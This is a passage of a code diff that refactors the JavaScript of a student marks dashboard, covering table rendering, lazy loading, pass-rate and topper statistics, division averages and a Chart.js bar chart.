-                // Set name and append backlog tag if backlogs > 0
-                let name = s.name.includes('BHAVSAR DAKSH')
-                    ? '<span class="sig-wrapper"><span class="sig-crown">👑</span><span class="sig-text">Daksh Bhavsar</span></span>'
-                    : s.name;
-                    
-                if (s.backlogs > 0) {
-                    name += ` <span class="backlog-tag">${s.backlogs} BK</span>`;
+                    return text.replace(new RegExp(escaped, 'gi'), match => `<mark class="search-match">${match}</mark>`);
                 }
 
-                // Apply text highlights based on currentSearchQuery
-                const highlightedName = highlightText(name, currentSearchQuery);
-                const highlightedEnroll = highlightText(s.enrollment, currentSearchQuery);
-                const highlightedMentor = highlightText(s.mentor, currentSearchQuery);
+                /* ═══ ROW BUILDER ═══ */
+                function buildRowHTML(s) {
+                    const rank = currentDept === 'Overall' ? s.globalRank : s.deptRank;
+                    const roll = currentMode === 'new' ? rank : s.roll;
+                    const div = s.div;
 
-                const showSem = (s.sem1 != null) && (currentDept === s.dept || currentDept === 'Overall')
-                                && (s.dept === 'SY1' || s.dept === 'SY2' || s.dept === 'SY4');
+                    let cls = '';
+                    if (rank <= 3 && currentMode === 'new') cls = 'row-top';
+                    const isHL = s.dept === 'SY4' && [102, 199, 91, 35, 31, 63, 86, 72].includes(s.roll);
+                    if (isHL) cls += ' row-hl';
 
-                const semCells = showSem
-                    ? `<td style="color:#22d3ee;font-weight:500">${s.sem1}</td>
-                       <td style="color:#22d3ee;font-weight:500">${s.sem2}</td>
-                       <td style="color:#f472b6;font-weight:500">${s.sem3marks}</td>
-                       <td style="color:#f472b6;font-weight:500">${s.sem3spi2}</td>
-                       <td style="color:#fbbf24;font-weight:700;background:rgba(251,191,36,0.07)">${s.totalSum}</td>`
-                    : '<td></td><td></td><td></td><td></td><td></td>';
+                    const dot = isHL ? '<span class="hl-dot"></span>' : '';
 
-                return `<tr class="${cls}" onclick="showStudentModal('${s.enrollment}')" style="cursor:pointer">
-<td class="cell-rank">${dot}#${rank}</td>
-<td style="font-weight:600">${roll}</td>
-<td>${s.dept}</td>
-<td><span style="background:var(--bg-glass-hover);padding:2px 8px;border-radius:4px;font-size:0.85rem">${div}</span></td>
-<td>${s.branch}</td>
-<td style="font-family:monospace;color:var(--text-muted)">${highlightedEnroll}</td>
-<td style="font-weight:500">${highlightedName}</td>
-<td>${highlightedMentor}</td>
-<td>${getMarkBadgeHTML(s.dm, 'dm')}</td>
-<td>${getMarkBadgeHTML(s.coa, 'coa')}</td>
-<td>${getMarkBadgeHTML(s.fsd2, 'fsd2')}</td>
-<td>${getMarkBadgeHTML(s.python2, 'python2')}</td>
-<td>${getMarkBadgeHTML(s.toc, 'toc')}</td>
-<td><span class="cell-total">${s.total.toFixed(2)}</span></td>
-<td style="color:var(--accent);font-weight:600">${s.sem3spi != null ? s.sem3spi.toFixed(2) : '--'}</td>
-${semCells}
+                    let rawName = (s.name.includes('BHAVSAR DAKSH') || s.name.includes('DAKSH BHAVSAR'))
+                        ? '<span class="relative inline-block"><span class="sig-crown absolute -top-1 -right-3 text-xs">👑</span><span class="font-sig text-xl" style="text-shadow:0 0 12px rgba(124,106,239,0.3)">Daksh Bhavsar</span></span>'
+                        : s.name;
+
+                    if (s.backlogs > 0) {
+                        rawName += ` <span class="px-1.5 py-0.5 rounded text-[0.6rem] font-bold bg-red-500/20 text-red-400 border border-red-500/30">${s.backlogs} BK</span>`;
+                    }
+
+                    const highlightedName = highlightText(rawName, currentSearchQuery);
+                    const highlightedEnroll = highlightText(s.enrollment, currentSearchQuery);
+                    const highlightedMentor = highlightText(s.mentor || '', currentSearchQuery);
+
+                    return `<tr class="${cls} cursor-pointer" onclick="showStudentModal('${s.enrollment}')">
+<td class="px-4 py-2.5 whitespace-nowrap c-rank font-extrabold text-sm">${dot}#${rank}</td>
+<td class="px-4 py-2.5 whitespace-nowrap font-semibold c-num">${roll}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${s.dept}</td>
+<td class="px-4 py-2.5 whitespace-nowrap"><span class="c-div px-2 py-0.5 rounded text-xs font-medium">${div}</span></td>
+<td class="px-4 py-2.5 whitespace-nowrap">${s.branch}</td>
+<td class="px-4 py-2.5 whitespace-nowrap c-enr text-xs">${highlightedEnroll}</td>
+<td class="px-4 py-2.5 whitespace-nowrap font-medium">${highlightedName}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${highlightedMentor}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${getMarkBadgeHTML(s.dm, 'dm')}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${getMarkBadgeHTML(s.coa, 'coa')}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${getMarkBadgeHTML(s.fsd2, 'fsd2')}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${getMarkBadgeHTML(s.python2, 'python2')}</td>
+<td class="px-4 py-2.5 whitespace-nowrap">${getMarkBadgeHTML(s.toc, 'toc')}</td>
+<td class="px-4 py-2.5 whitespace-nowrap"><span class="c-total px-2.5 py-1 rounded-md font-bold text-xs inline-block">${s.total.toFixed(2)}</span></td>
+<td class="px-4 py-2.5 whitespace-nowrap text-cyan-400 font-semibold">${s.sem3spi != null ? s.sem3spi.toFixed(2) : '--'}</td>
 </tr>`;
-            }
+                }
 
-            /* ═══ RENDER (batched) ═══ */
-            function renderBatch(start, count) {
-                const end = Math.min(start + count, filteredData.length);
-                let html = '';
-                for (let i = start; i < end; i++) html += buildRowHTML(filteredData[i]);
-                return { html, rendered: end };
-            }
+                function renderBatch(start, count) {
+                    const end = Math.min(start + count, filteredData.length);
+                    let html = '';
+                    for (let i = start; i < end; i++) html += buildRowHTML(filteredData[i]);
+                    return { html, rendered: end };
+                }
 
-            function renderTable() {
-                const tbody = document.getElementById('tableBody');
-                document.getElementById('badgeCount') && (document.getElementById('badgeCount').textContent = filteredData.length);
+                function renderTable() {
+                    const tbody = document.getElementById('tableBody');
+                    document.getElementById('badgeCount').textContent = filteredData.length;
 
-                if (!filteredData.length) {
-                    tbody.innerHTML = '<tr><td colspan="19" style="text-align:center;padding:40px;color:var(--text-muted)">No records found</td></tr>';
-                    renderedCount = 0;
+                    if (!filteredData.length) {
+                        tbody.innerHTML = '<tr><td colspan="15" class="text-center py-16 text-[var(--text-tertiary)]"><i class="ri-search-eye-line block text-3xl opacity-30 mb-2"></i>No records found</td></tr>';
+                        renderedCount = 0;
+                        updateLoadMore();
+                        return;
+                    }
+
+                    const batch = renderBatch(0, BATCH);
+                    tbody.innerHTML = batch.html;
+                    renderedCount = batch.rendered;
                     updateLoadMore();
-                    return;
                 }
 
-                const batch = renderBatch(0, BATCH);
-                tbody.innerHTML = batch.html;
-                renderedCount = batch.rendered;
-                updateLoadMore();
-            }
-
-            function updateLoadMore() {
-                const bar    = document.getElementById('loadMoreBar');
-                const remain = filteredData.length - renderedCount;
-                if (remain > 0) {
-                    bar && bar.classList.remove('hidden');
-                    const rc = document.getElementById('remainCount');
-                    if (rc) rc.textContent = remain;
-                } else {
-                    bar && bar.classList.add('hidden');
+                function updateLoadMore() {
+                    const bar = document.getElementById('loadMoreBar');
+                    const remain = filteredData.length - renderedCount;
+                    if (remain > 0) {
+                        bar.classList.remove('hidden');
+                        document.getElementById('remainCount').textContent = remain;
+                    } else {
+                        bar.classList.add('hidden');
+                    }
                 }
-            }
 
-            window.loadMore = function () {
-                const batch = renderBatch(renderedCount, BATCH);
-                document.getElementById('tableBody').insertAdjacentHTML('beforeend', batch.html);
-                renderedCount = batch.rendered;
-                updateLoadMore();
-            };
+                window.loadMore = function () {
+                    const batch = renderBatch(renderedCount, BATCH);
+                    document.getElementById('tableBody').insertAdjacentHTML('beforeend', batch.html);
+                    renderedCount = batch.rendered;
+                    updateLoadMore();
+                };
 
-            /* ═══ AUTO-LOAD ON SCROLL ═══ */
-            const tableScroll = document.getElementById('tableScroll') || document.querySelector('.table-scroll');
-            if (tableScroll) {
-                let ticking = false;
-                tableScroll.addEventListener('scroll', function () {
-                    if (ticking) return;
-                    ticking = true;
-                    requestAnimationFrame(() => {
-                        if (tableScroll.scrollTop + tableScroll.clientHeight >= tableScroll.scrollHeight - 120) {
-                            if (renderedCount < filteredData.length) window.loadMore();
-                        }
-                        ticking = false;
-                    });
-                }, { passive: true });
-            }
+                /* ═══ AUTO-LOAD ON SCROLL ═══ */
+                const tableScroll = document.getElementById('tableScroll');
+                let scrollTicking = false;
+                if (tableScroll) {
+                    tableScroll.addEventListener('scroll', function () {
+                        if (scrollTicking) return;
+                        scrollTicking = true;
+                        requestAnimationFrame(() => {
+                            const el = tableScroll;
+                            if (el.scrollTop + el.clientHeight >= el.scrollHeight - 100) {
+                                if (renderedCount < filteredData.length) window.loadMore();
+                            }
+                            scrollTicking = false;
+                        });
+                    }, { passive: true });
+                }
 
-            /* ═══ STATS ═══ */
-            function updateStats() {
-                const sem4Pool = filteredData.filter(s => s.total > 0);
-                
-                document.getElementById('stat-count').innerText = filteredData.length;
-                
-                if (!sem4Pool.length) {
-                    document.getElementById('stat-avg').innerText   = '--';
-                    document.getElementById('stat-topper').innerText = '--';
-                    
-                    // Reset toppers text
-                    const topperIds = [
-                        'topper-dm-name', 'topper-dm-meta', 'topper-dm-score',
-                        'topper-coa-name', 'topper-coa-meta', 'topper-coa-score',
-                        'topper-fsd-name', 'topper-fsd-meta', 'topper-fsd-score',
-                        'topper-python-name', 'topper-python-meta', 'topper-python-score',
-                        'topper-toc-name', 'topper-toc-meta', 'topper-toc-score'
+                /* ═══ STATS ═══ */
+                function updateStats() {
+                    const passEl = document.getElementById('stat-pass');
+                    const passInfo = document.getElementById('stat-pass-info');
+
+                    if (!filteredData.length) {
+                        document.getElementById('stat-count').textContent = '--';
+                        document.getElementById('stat-avg').textContent = '--';
+                        document.getElementById('stat-topper').textContent = '--';
+                        passEl.textContent = '--';
+                        passInfo.textContent = 'Min 33 per subject';
+                        return;
+                    }
+
+                    const total = filteredData.reduce((a, c) => a + c.total, 0);
+                    const n = filteredData.length;
+
+                    // Top performer
+                    const topper = filteredData.reduce((p, c) => p.total > c.total ? p : c);
+                    document.getElementById('stat-topper').textContent = topper.total.toFixed(1);
+
+                    // Count
+                    document.getElementById('stat-count').textContent = n;
+
+                    // Average Score
+                    document.getElementById('stat-avg').textContent = (total / n).toFixed(1);
+
+                    // Pass rate: pass if scored >= 33 in EACH of the 5 subjects
+                    const passed = filteredData.filter(s => s.dm >= 33 && s.coa >= 33 && s.fsd2 >= 33 && s.python2 >= 33 && s.toc >= 33).length;
+                    const failed = n - passed;
+                    const rate = ((passed / n) * 100).toFixed(1);
+
+                    passEl.textContent = rate + '%';
+                    if (failed === 0) {
+                        passInfo.textContent = 'All ' + n + ' Cleared \u2714';
+                    } else {
+                        passInfo.textContent = passed + ' passed \u00B7 ' + failed + ' failed';
+                    }
+
+                    // Subject Toppers calculation
+                    const subjects = [
+                        { key: 'dm', nameId: 'topper-dm-name', metaId: 'topper-dm-meta', scoreId: 'topper-dm-score' },
+                        { key: 'coa', nameId: 'topper-coa-name', metaId: 'topper-coa-meta', scoreId: 'topper-coa-score' },
+                        { key: 'fsd2', nameId: 'topper-fsd-name', metaId: 'topper-fsd-meta', scoreId: 'topper-fsd-score' },
+                        { key: 'python2', nameId: 'topper-python-name', metaId: 'topper-python-meta', scoreId: 'topper-python-score' },
+                        { key: 'toc', nameId: 'topper-toc-name', metaId: 'topper-toc-meta', scoreId: 'topper-toc-score' }
                     ];
-                    topperIds.forEach(id => {
-                        const el = document.getElementById(id);
-                        if (el) el.innerText = '--';
+
+                    subjects.forEach(sub => {
+                        const topStudent = filteredData.reduce((p, c) => (p[sub.key] || 0) > (c[sub.key] || 0) ? p : c);
+                        const sScore = topStudent[sub.key] || 0;
+                        const parts = topStudent.name.split(' ');
+                        const formatName = parts.length >= 2 ? `${parts[0]} ${parts[1]}` : topStudent.name;
+
+                        document.getElementById(sub.nameId).textContent = formatName;
+                        document.getElementById(sub.nameId).title = topStudent.name;
+                        document.getElementById(sub.metaId).textContent = `Roll ${topStudent.roll} • Div ${topStudent.div}`;
+                        document.getElementById(sub.scoreId).textContent = sScore.toFixed(1);
                     });
-                    document.getElementById('divStandingsList').innerHTML = '<div style="text-align:center;padding:10px;color:var(--text-muted)">No Sem-IV data</div>';
-                    return;
-                }
-                
-                const n      = sem4Pool.length;
-                const sum    = sem4Pool.reduce((a, c) => a + c.total, 0);
-                const topper = sem4Pool.reduce((p, c) => p.total > c.total ? p : c);
-                document.getElementById('stat-avg').innerText    = (sum / n).toFixed(1);
-                
-                // Set Topper Score only in Stat Card
-                document.getElementById('stat-topper').innerText = topper.total.toFixed(1);
 
-                // Calculate subject toppers
-                const subjects = [
-                    { key: 'dm', nameId: 'topper-dm-name', metaId: 'topper-dm-meta', scoreId: 'topper-dm-score' },
-                    { key: 'coa', nameId: 'topper-coa-name', metaId: 'topper-coa-meta', scoreId: 'topper-coa-score' },
-                    { key: 'fsd2', nameId: 'topper-fsd-name', metaId: 'topper-fsd-meta', scoreId: 'topper-fsd-score' },
-                    { key: 'python2', nameId: 'topper-python-name', metaId: 'topper-python-meta', scoreId: 'topper-python-score' },
-                    { key: 'toc', nameId: 'topper-toc-name', metaId: 'topper-toc-meta', scoreId: 'topper-toc-score' }
-                ];
-                
-                subjects.forEach(sub => {
-                    const topStudent = sem4Pool.reduce((p, c) => (p[sub.key] || 0) > (c[sub.key] || 0) ? p : c);
-                    const sScore = topStudent[sub.key] || 0;
-                    
-                    // Format Name to FirstName LastName (compact)
-                    const parts = topStudent.name.split(' ');
-                    const formatName = parts.length >= 2 ? `${parts[0]} ${parts[1]}` : topStudent.name;
-                    
-                    document.getElementById(sub.nameId).innerText = formatName;
-                    document.getElementById(sub.metaId).innerText = `Roll ${topStudent.roll} • Div ${topStudent.div}`;
-                    document.getElementById(sub.scoreId).innerText = sScore.toFixed(1);
-                });
+                    // Division Standings Calculation
+                    const divMap = {};
+                    filteredData.forEach(s => {
+                        const key = `${s.div}`;
+                        if (!divMap[key]) divMap[key] = { count: 0, sum: 0 };
+                        divMap[key].count++;
+                        divMap[key].sum += s.total;
+                    });
 
-                // Calculate division standings
-                const divMap = {};
-                sem4Pool.forEach(s => {
-                    const key = `${s.dept}-${s.div}`;
-                    if (!divMap[key]) divMap[key] = { count: 0, sum: 0 };
-                    divMap[key].count++;
-                    divMap[key].sum += s.total;
-                });
-                
-                const standings = Object.entries(divMap).map(([key, data]) => {
-                    return { key, avg: data.sum / data.count, count: data.count };
-                }).sort((a, b) => b.avg - a.avg);
-                
-                let standingsHTML = '';
-                standings.slice(0, 4).forEach((st, idx) => {
-                    let medal = `#${idx + 1}`;
-                    if (idx === 0) medal = '🥇';
-                    else if (idx === 1) medal = '🥈';
-                    else if (idx === 2) medal = '🥉';
-                    
-                    standingsHTML += `
-                        <div class="standing-row">
-                            <span class="standing-rank">${medal}</span>
-                            <span class="standing-name">${st.key} <small style="color:var(--text-muted); font-size:0.7rem; font-weight:400;">(${st.count} std)</small></span>
-                            <span class="standing-avg">${st.avg.toFixed(1)}</span>
+                    const standings = Object.entries(divMap).map(([key, data]) => {
+                        return { key, avg: data.sum / data.count, count: data.count };
+                    }).sort((a, b) => b.avg - a.avg);
+
+                    let standingsHTML = '';
+                    standings.slice(0, 4).forEach((st, idx) => {
+                        let medal = `#${idx + 1}`;
+                        if (idx === 0) medal = '🥇';
+                        else if (idx === 1) medal = '🥈';
+                        else if (idx === 2) medal = '🥉';
+
+                        standingsHTML += `
+                        <div class="flex items-center justify-between text-[0.7rem] py-[2px]">
+                            <span class="font-bold text-[var(--text)] flex items-center gap-1.5">${medal} Div ${st.key} <small class="text-[var(--text-tertiary)] font-normal text-[0.6rem]">(${st.count})</small></span>
+                            <span class="font-extrabold text-[#7c6aef] bg-[#7c6aef]/10 px-1.5 py-0.5 rounded">${st.avg.toFixed(1)}</span>
                         </div>
                     `;
-                });
-                document.getElementById('divStandingsList').innerHTML = standingsHTML || '<div style="text-align:center;padding:10px;color:var(--text-muted)">No data</div>';
-            }
-
-            /* ═══ CHART (throttled RAF) ═══ */
-            function scheduleChartUpdate() {
-                if (chartRafId) cancelAnimationFrame(chartRafId);
-                chartRafId = requestAnimationFrame(updateChart);
-            }
-
-            function updateChart() {
-                chartRafId = null;
-                const ctx   = document.getElementById('gradeChart').getContext('2d');
-                const dark  = document.documentElement.getAttribute('data-theme') === 'dark';
-                const grid  = dark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.05)';
-                const tick  = dark ? '#888' : '#666';
-                if (gradeChart) gradeChart.destroy();
-
-                const sem4Pool = filteredData.filter(s => s.total > 0);
-                const subs = ['dm','coa','fsd2','python2','toc'];
-                const n    = sem4Pool.length || 1;
-                const avgs = subs.map(k => (sem4Pool.reduce((a, s) => a + (s[k] || 0), 0) / n).toFixed(1));
-
-                gradeChart = new Chart(ctx, {
-                    type: 'bar',
-                    data: {
-                        labels: ['Discrete Math', 'COA', 'FSD-II', 'Python-II', 'TOC'],
-                        datasets: [{
-                            label: 'Avg Score', data: avgs,
-                            backgroundColor: [
-                                'rgba(108,92,231,0.7)', 'rgba(0,206,201,0.7)',
-                                'rgba(232,67,147,0.7)', 'rgba(253,203,110,0.7)', 'rgba(46,213,115,0.7)'
-                            ],
-                            borderRadius: 8, barThickness: 40
-                        }]
-                    },
-                    options: {
-                        responsive: true, maintainAspectRatio: false,
-                        animation: false,
-                        plugins: { legend: { display: false } },
-                        scales: {
-                            y: { beginAtZero: true, max: 100, grid: { color: grid }, ticks: { color: tick } },
-                            x: { grid: { display: false }, ticks: { color: tick } }
-                        }
-                    }
-                });
-            }
-
-            /* ═══ SORT ═══ */
-            window.sortTable = function (key) {
-                if (lastSortKey === key) {
-                    sortDir = sortDir === 'asc' ? 'desc' : 'asc';
-                } else {
-                    sortDir = 'asc';
-                    lastSortKey = key;
+                    });
+                    document.getElementById('divStandingsList').innerHTML = standingsHTML || '<div class="text-center text-[var(--text-tertiary)] py-1">No data</div>';
                 }
-                filteredData.sort((a, b) => {
-                    let va, vb;
-                    if (key === 'rank') {
-                        va = currentDept === 'Overall' ? a.globalRank : a.deptRank;
-                        vb = currentDept === 'Overall' ? b.globalRank : b.deptRank;
-                    } else if (key === 'roll') {
-                        va = a.roll;
-                        vb = b.roll;
-                    } else if (['sem1','sem2','sem3marks','sem3spi2','totalSum','sem3spi'].includes(key)) {
-                        va = a[key] ?? -1; vb = b[key] ?? -1;
-                    } else {
-                        va = a[key]; vb = b[key];
-                    }
-                    if (typeof va === 'string') va = va.toLowerCase();
-                    if (typeof vb === 'string') vb = vb.toLowerCase();
-                    return (va < vb ? -1 : va > vb ? 1 : 0) * (sortDir === 'asc' ? 1 : -1);
-                });
-                renderTable();
-            };
 
-            /* ═══ EXPORT ═══ */
-            window.exportCSV = function () {
-                const showSemCols = (currentDept === 'SY1' || currentDept === 'SY2' || currentDept === 'SY4' || currentDept === 'Overall');
-                let csv = 'Rank,Roll No,DEPT,Division,Branch,Enrollment,Name,Mentor,DM,COA,FSD-II,Python-II,TOC,Total,SEM-III SPI';
-                if (showSemCols) csv += ',Sem I SPI,Sem II SPI,Sem III /10,SPI\u00d72 /20,Total /40';
-                csv += '\n';
-                filteredData.forEach(s => {
-                    const rk  = currentDept === 'Overall' ? s.globalRank : s.deptRank;
-                    const rol = s.roll;
-                    let row   = `${rk},${rol},${s.dept},${s.div},${s.branch},${s.enrollment},"${s.name}",${s.mentor},${s.dm},${s.coa},${s.fsd2},${s.python2},${s.toc},${s.total},${s.sem3spi??''}`;
-                    if (showSemCols) {
-                        const hasSem = s.dept === 'SY1' || s.dept === 'SY2' || s.dept === 'SY4';
-                        row += hasSem ? `,${s.sem1??''},${s.sem2??''},${s.sem3marks??''},${s.sem3spi2??''},${s.totalSum??''}` : ',,,,,';
-                    }
-                    csv += row + '\n';
-                });
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
-                a.download = `Marksheet_${currentMode}_${currentDept}.csv`;
-                a.click(); URL.revokeObjectURL(a.href);
-            };
+                /* ═══ CHART (throttled) ═══ */
+                function scheduleChartUpdate() {
+                    if (chartRafId) cancelAnimationFrame(chartRafId);
+                    chartRafId = requestAnimationFrame(updateChart);
+                }
 
-            /* ═══ MASTER RUN ═══ */
-            function run() {
-                filterData();
-                renderTable();
-                updateStats();
-                scheduleChartUpdate();
-                updateComparisonMatrix();
-                updateExamMatrix();
-            }
+                function updateChart() {
+                    chartRafId = null;
+                    const canvas = document.getElementById('gradeChart');
+                    if (!canvas) return;
+                    const ctx = canvas.getContext('2d');
+                    const dark = document.documentElement.getAttribute('data-theme') === 'dark';
+                    if (gradeChart) gradeChart.destroy();
 
-            /* ═══ DIVISION WISE SUBJECT AVERAGES MATRIX ═══ */
-            function updateComparisonMatrix() {
-                const tbody = document.getElementById('matrixTableBody');
-                if (!tbody) return;
-                
-                const divMap = {};
-                const pool = currentDept !== 'Overall' ? allData.filter(s => s.dept === currentDept) : allData;
-                const sem4Pool = pool.filter(s => s.total > 0);
-                
-                sem4Pool.forEach(s => {
-                    const key = `${s.dept}-${s.div}`;
-                    if (!divMap[key]) {
-                        divMap[key] = {
-                            count: 0,
-                            dmSum: 0,
-                            coaSum: 0,
-                            fsdSum: 0,
-                            pySum: 0,
-                            tocSum: 0,
-                            totalSum: 0
+                    const subs = ['dm', 'coa', 'fsd2', 'python2', 'toc'];
+                    const n = filteredData.length || 1;
+                    const avgs = subs.map(k => (filteredData.reduce((a, s) => a + (s[k] || 0), 0) / n).toFixed(1));
+
+                    gradeChart = new Chart(ctx, {
+                        type: 'bar',
+                        data: {
+                            labels: ['Discrete Math', 'COA', 'FSD-II', 'Python-II', 'TOC'],
+                            datasets: [{
+                                label: 'Avg Score',
+                                data: avgs,
+                                backgroundColor: [
+                                    'rgba(124,106,239,0.7)',
+                                    'rgba(34,211,238,0.7)',
+                                    'rgba(236,72,153,0.7)',
+                                    'rgba(251,191,36,0.7)',
+                                    'rgba(52,211,153,0.7)'
+                                ],
+                                borderRadius: 6,
+                                barThickness: 32
+                            }]
+                        },
+                        options: {
+                            responsive: true, maintainAspectRatio: false,
+                            animation: false,
+                            plugins: { legend: { display: false } },
+                            scales: {
+                                y: {
+                                    beginAtZero: true, max: 100,
+                                    grid: { color: dark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.04)', drawBorder: false },
+                                    ticks: { color: dark ? '#5c5f73' : '#9ca0b0', font: { size: 10 } }
+                                },
+                                x: {
+                                    grid: { display: false },
+                                    ticks: { color: dark ? '#5c5f73' : '#9ca0b0', font: { size: 10 } }
+                                }
+                            }
+                        }
+                    });
+                }
+
+                /* ═══ MATRIX ANALYTICS ═══ */
+                function updateComparisonMatrix() {
+                    const tbody = document.getElementById('matrixTableBody');
+                    if (!tbody) return;
+
+                    const divMap = {};
+                    const sem4Pool = filteredData.filter(s => s.total > 0);
+
+                    sem4Pool.forEach(s => {
+                        const key = `${s.div}`;
+                        if (!divMap[key]) {
+                            divMap[key] = { count: 0, dmSum: 0, coaSum: 0, fsdSum: 0, pySum: 0, tocSum: 0, totalSum: 0 };
+                        }
+                        divMap[key].count++;
+                        divMap[key].dmSum += s.dm;
+                        divMap[key].coaSum += s.coa;
+                        divMap[key].fsdSum += s.fsd2;
+                        divMap[key].pySum += s.python2;
+                        divMap[key].tocSum += s.toc;
+                        divMap[key].totalSum += s.total;
+                    });
+
+                    const rows = Object.entries(divMap).map(([key, data]) => {
+                        const c = data.count || 1;
+                        return {
+                            key,
+                            dmAvg: data.dmSum / c,
+                            coaAvg: data.coaSum / c,
+                            fsdAvg: data.fsdSum / c,
+                            pyAvg: data.pySum / c,
+                            tocAvg: data.tocSum / c,
+                            totalAvg: data.totalSum / c,
+                            count: data.count
                         };
-                    }
-                    divMap[key].count++;
-                    divMap[key].dmSum += s.dm;
-                    divMap[key].coaSum += s.coa;
-                    divMap[key].fsdSum += s.fsd2;
-                    divMap[key].pySum += s.python2;
-                    divMap[key].tocSum += s.toc;
-                    divMap[key].totalSum += s.total;
-                });
-                
-                const rows = Object.entries(divMap).map(([key, data]) => {
-                    const c = data.count || 1;
-                    return {
-                        key,
-                        dmAvg: data.dmSum / c,
-                        coaAvg: data.coaSum / c,
-                        fsdAvg: data.fsdSum / c,
-                        pyAvg: data.pySum / c,
-                        tocAvg: data.tocSum / c,
-                        totalAvg: data.totalSum / c,
-                        count: data.count
-                    };
-                }).sort((a, b) => b.totalAvg - a.totalAvg);
-                
-                let html = '';
-                rows.forEach(r => {
-                    html += `
+                    }).sort((a, b) => b.totalAvg - a.totalAvg);
+
+                    let html = '';
+                    rows.forEach(r => {
+                        html += `
                         <tr>
-                            <td style="font-weight:600; text-align: left; color:var(--text-main);">${r.key} <small style="color:var(--text-muted); font-weight:400;">(${r.count} std)</small></td>
-                            <td>${r.dmAvg.toFixed(1)}</td>
-                            <td>${r.coaAvg.toFixed(1)}</td>
-                            <td>${r.fsdAvg.toFixed(1)}</td>
-                            <td>${r.pyAvg.toFixed(1)}</td>
-                            <td>${r.tocAvg.toFixed(1)}</td>
-                            <td style="font-weight:700; color:var(--accent);">${r.totalAvg.toFixed(1)}</td>
+                            <td class="text-left px-3 py-2 font-semibold text-[var(--text)]">Div ${r.key} <small class="text-[var(--text-tertiary)]">(${r.count})</small></td>
+                            <td class="px-2 py-2">${r.dmAvg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.coaAvg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.fsdAvg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.pyAvg.toFixed(1)}</td>
+                            <td class="px-2 py-2">${r.tocAvg.toFixed(1)}</td>
+                            <td class="px-2 py-2 font-bold text-cyan-400">${r.totalAvg.toFixed(1)}</td>
                         </tr>
                     `;
-                });
-                tbody.innerHTML = html || '<tr><td colspan="7" style="text-align:center; color:var(--text-muted);">No Sem-IV data available</td></tr>';
-            }
-
-            /* ═══ EXAM WISE SUBJECT PERFORMANCE MATRIX ═══ */
-            window.updateExamMatrix = function() {
-                const subKey = document.getElementById('examMatrixSubject').value;
-                const tbody = document.getElementById('examMatrixTableBody');
-                if (!tbody) return;
-                
-                const pool = currentDept !== 'Overall' ? allData.filter(s => s.dept === currentDept) : allData;
-                const sem4Pool = pool.filter(s => s.total > 0);
-                
-                const divMap = {};
-                sem4Pool.forEach(s => {
-                    const key = `${s.dept}-${s.div}`;
-                    if (!divMap[key]) {
-                        divMap[key] = {
-                            count: 0,
-                            t1Sum: 0,
-                            t2Sum: 0,
-                            t3Sum: 0,
-                            t4Sum: 0,
-                            totalSum: 0
-                        };
-                    }
-                    
-                    let t1 = 0, t2 = 0, t3 = 0, t4 = 0, total = 0;
-                    if (subKey === 'dm') {
-                        t2 = s.dm2 || 0;
-                        t3 = s.dm3 || 0;
-                        t4 = s.dm4 || 0;
-                        total = s.dm || 0;
-                        t1 = total - t2 - t3 - (t4 / 2.0);
-                    } else if (subKey === 'coa') {
-                        t2 = s.coa2 || 0;
-                        t3 = s.coa3 || 0;
-                        t4 = s.coa4 || 0;
-                        total = s.coa || 0;
-                        t1 = total - t2 - t3 - (t4 / 2.0);
-                    } else if (subKey === 'fsd2') {
-                        t2 = s.fsd22 || 0;
-                        t3 = s.fsd23 || 0;
-                        t4 = s.fsd24 || 0;
-                        total = s.fsd2 || 0;
-                        t1 = total - t2 - t3 - (t4 / 2.0);
-                    } else if (subKey === 'python2') {
-                        t2 = s.python22 || 0;
-                        t3 = s.python23 || 0;
-                        t4 = s.python24 || 0;
-                        total = s.python2 || 0;
-                        t1 = total - t2 - t3 - (t4 / 2.0);
-                    } else if (subKey === 'toc') {
-                        t2 = s.toc2 || 0;
-                        t3 = s.toc3 || 0;
-                        t4 = s.toc4 || 0;
-                        total = s.toc || 0;
-                        t1 = total - t2 - t3 - (t4 / 2.0);
-                    }
-                    
-                    divMap[key].count++;
-                    divMap[key].t1Sum += Math.max(0, t1);
-                    divMap[key].t2Sum += t2;
-                    divMap[key].t3Sum += t3;
-                    divMap[key].t4Sum += t4;
-                    divMap[key].totalSum += total;
-                });
-                
-                // Hide or show T4 column header and cells
-                const t4Header = document.getElementById('examMatrixT4Header');
-                if (t4Header) {
-                    t4Header.style.display = '';
+                    });
+                    tbody.innerHTML = html || '<tr><td colspan="7" class="text-center py-4 text-[var(--text-tertiary)]">No Sem-IV data</td></tr>';
                 }
-                
-                const rows = Object.entries(divMap).map(([key, data]) => {
-                    const c = data.count || 1;
-                    return {
-                        key,
-                        t1Avg: data.t1Sum / c,
-                        t2Avg: data.t2Sum / c,
-                        t3Avg: data.t3Sum / c,
-                        t4Avg: data.t4Sum / c,
-                        totalAvg: data.totalSum / c,
-                        count: data.count
-                    };
-                }).sort((a, b) => b.totalAvg - a.totalAvg);
-                
-                let html = '';
-                rows.forEach(r => {
-                    const t4Cell = `<td>${r.t4Avg.toFixed(1)}</td>`;
-                    html += `
+
+                window.updateExamMatrix = function () {
+                    const subKey = document.getElementById('examMatrixSubject').value;
+                    const tbody = document.getElementById('examMatrixTableBody');
+                    if (!tbody) return;
+
+                    const sem4Pool = filteredData.filter(s => s.total > 0);
+                    const divMap = {};
+
+                    sem4Pool.forEach(s => {
+                        const key = `${s.div}`;
+                        if (!divMap[key]) {
+                            divMap[key] = { count: 0, t1Sum: 0, t2Sum: 0, t3Sum: 0, t4Sum: 0, totalSum: 0 };
+                        }
+                        let t1 = 0, t2 = 0, t3 = 0, t4 = 0, total = s[subKey] || 0;
+                        if (subKey === 'dm') { t2 = s.dm2 || 0; t3 = s.dm3 || 0; t4 = s.dm4 || 0; }
+                        else if (subKey === 'coa') { t2 = s.coa2 || 0; t3 = s.coa3 || 0; t4 = s.coa4 || 0; }
